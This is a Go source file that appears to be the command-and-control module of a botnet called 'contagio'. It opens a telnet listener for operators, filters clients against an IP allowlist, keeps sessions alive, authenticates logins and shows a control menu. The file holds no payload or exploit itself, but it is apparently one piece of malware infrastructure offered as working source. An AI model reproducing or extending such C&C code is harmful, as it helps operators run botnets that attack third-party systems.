package cnc

import (
	"contagio/contagio/cnc/database"
	"contagio/contagio/config"
	"fmt"
	"net"
	"strings"
	"time"
)

var NewConnChan = make(chan net.Conn)

type Connection struct {
	config *config.Config
	conn   net.Conn
	login  string
}

func StartCnc(config *config.Config) {

	defer Catch()

	telnet, err := net.Listen("tcp", config.CncServer)
	if err != nil {
		fmt.Println("[contagio] Cnc fatal error: " + err.Error())
		config.Wg.Done()
		return
	}

	fmt.Println("[contagio] Cnc server ready: " + config.CncServer)

	go func() {
		defer Catch()
		for {

			conn, err := telnet.Accept()

			if err != nil {
				continue
			}

			NewConnChan <- conn
		}
	}()

	for {
		conn := <-NewConnChan
		c := initConn(conn, config)
		go c.newConn()
	}
}

func (c *Connection) newConn() {
	defer c.conn.Close()
	c.Cls()
	go c.handle()

	isAuth := c.Auth()
	if !isAuth {
		return
	}
	c.Cls()
	go c.Title()
	c.CncMainMenu()

}

func (c *Connection) handle() {
	for {
		_, err := c.conn.Write([]byte{0x0})
		if err != nil {
			c.conn.Close()
			return
		}
		time.Sleep(3 * time.Second)
	}
}

func initConn(conn net.Conn, config *config.Config) *Connection {

	defer Catch()
	if !config.Auth.AllowAllIps {
		if !database.CheckIp(strings.Split(conn.RemoteAddr().String(), ":")[0]) {
			conn.Write([]byte(GeneratePrompt(config.Auth.IpIsNotAllowedError)))
			conn.Close()
		}
	}

	return &Connection{
		conn:   conn,
		config: config,
	}
}
